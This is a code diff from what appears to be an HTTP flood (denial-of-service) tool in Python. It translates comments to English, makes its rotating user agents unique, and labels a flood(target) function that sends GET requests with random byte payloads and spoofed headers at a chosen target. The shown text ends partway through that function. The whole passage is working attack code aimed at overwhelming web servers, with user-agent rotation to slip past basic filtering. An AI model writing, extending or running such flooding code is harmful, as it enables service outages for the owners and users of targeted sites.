@@ -1,4 +1,3 @@
-# Importa os modulos
 import random
 
 import requests
@@ -6,10 +5,12 @@ from colorama import Fore
 
 import tools.randomData as randomData
 
-# Carrega os user agents
+# Loads user agents
 user_agents = []
-for _ in range(30):
-    user_agents.append(randomData.random_useragent())
+while len(user_agents) < 30:
+    user_agent = randomData.random_useragent()
+    if not user_agent in user_agents:
+        user_agents.append(user_agent)
 
 # Headers
 headers = {
@@ -21,16 +22,16 @@ headers = {
     "User-agent": random.choice(user_agents),
 }
 
-
+# Flood function
 def flood(target):
     payload = str(random._urandom(random.randint(10, 150)))
     try:
         r = requests.get(target, params=payload, headers=headers, timeout=4)
     except requests.exceptions.ConnectTimeout:
-        print(f"{Fore.RED}[!] {Fore.MAGENTA}Timed out{Fore.RESET}")
+        print(f"{Fore.RED}[!] {Fore.MAGENTA}Timed out!{Fore.RESET}")
     except Exception as e:
         print(
-            f"{Fore.MAGENTA}Error sending requests GET\n{Fore.MAGENTA}{e}{Fore.RESET}"
+            f"{Fore.MAGENTA}Error sending GET requests!\n{Fore.MAGENTA}{e}{Fore.RESET}"
         )
     else:
         print(
